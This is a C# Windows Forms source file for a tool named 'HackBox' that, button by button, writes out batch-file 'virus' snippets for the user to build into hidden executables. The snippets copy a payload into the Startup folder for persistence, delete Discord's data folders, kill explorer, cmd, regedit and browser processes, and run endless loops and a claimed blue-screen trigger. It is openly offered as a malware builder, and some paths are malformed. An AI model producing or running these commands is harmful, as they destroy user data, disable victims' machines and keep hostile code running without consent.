using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace HackBox
{
	public partial class Form1 : Form
	{
		public Form1()
		{
			InitializeComponent();
			
	
		}

		private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
		{

		}

		private void button1_Click(object sender, EventArgs e)
		{
			string selfdos = "ping -t -l 3000 127.0.0.1";
			richTextBox1.AppendText(selfdos + "\n");

		}

		private void Form1_Load(object sender, EventArgs e)
		{
			MessageBox.Show("You need to download BAT TO EXE CONVERTER to compile these better and make them background process!");
			
		}

		private void button2_Click(object sender, EventArgs e)
		{
			string start = @"copy %USERPROFILE%\Desktop\yourvirusname.bat %USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup ";
			string start2 = @"copy %USERPROFILE%\Downloads\yourvirusname.bat %USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup";
			string start3 = @"copy %USERPROFILE%\Documents\yourvirusname.bat %USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup";
			string start4 = @"copy %USERPROFILE%\Pictures\yourvirusname.bat %USERPROFILE\AppData\Microsoft\WindowsStart Menu\Programs\Startup";
			string start5 = @"copy %USERPROFILE%\Videos\yourvirusname.bat %USERPROFILE\AppData\Microsoft\WindowsStart Menu\Programs\Startup";
			string start6 = @"copy %USERPROFILE%\Music\yourvirusname.bat %USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup";
			richTextBox1.AppendText(start + "\n");
			richTextBox1.AppendText(start2 + "\n");
			richTextBox1.AppendText(start3 + "\n");
			richTextBox1.AppendText(start4 + "\n");
			richTextBox1.AppendText(start5 + "\n");
			richTextBox1.AppendText(start6 + "\n");

		}

		private void button3_Click(object sender, EventArgs e)
		{
			string mine = " :mine";
			string mine2 = "echo %random%%random%";
			string mine3 = "goto mine";
			richTextBox1.AppendText(mine + "\n");
			richTextBox1.AppendText(mine2 + "\n");
			richTextBox1.AppendText(mine3 + "\n" + "::plusminus on top");

		}

		private void button4_Click(object sender, EventArgs e)
		{
			string del = @"del /q /f %appdata%\Discord";
			string del2 = @"del /q /f %localappdata%\discord";
			richTextBox1.AppendText(del + "\n");
			richTextBox1.AppendText(del2 + "\n");
		}

		private void button5_Click(object sender, EventArgs e)
		{

		}

		private void button5_Click_1(object sender, EventArgs e)
		{
			this.Hide();
			Form2 penis = new Form2();
			penis.ShowDialog();
			this.Close();
		}

		private void button6_Click(object sender, EventArgs e)
		{
			string expl = "taskkill /f /im explorer.exe";
			string discord = "taskkill /f /im Discord.exe";
			string reg = "taskkill /f /im regedit.exe";
			string skype = "taskkill /f /im skype.exe";
			string cmd = "taskkill /f /im cmd.exe";
			string chrome = "taskkill /f /im chrome.exe";

			richTextBox1.AppendText(cmd + "\n");
			richTextBox1.AppendText(expl + "\n");
			richTextBox1.AppendText(discord + "\n");
			richTextBox1.AppendText(reg + "\n");
			richTextBox1.AppendText(skype + "\n");
			richTextBox1.AppendText(chrome + "\n");

		}

		private void button7_Click(object sender, EventArgs e)
		{
			string integer = ":roast ";
			string loop = "start https://www.youtube.com/watch?v=RfAQbrw1Eog";
			string goint = "goto roast";
			richTextBox1.AppendText(integer + "\n");
			richTextBox1.AppendText(loop + "\n");
			richTextBox1.AppendText(goint + "\n");

		}

		private void button8_Click(object sender, EventArgs e)
		{
			string bsod = "powershell.exe wininit.exe";
			richTextBox1.AppendText(bsod);
		}
	}
}


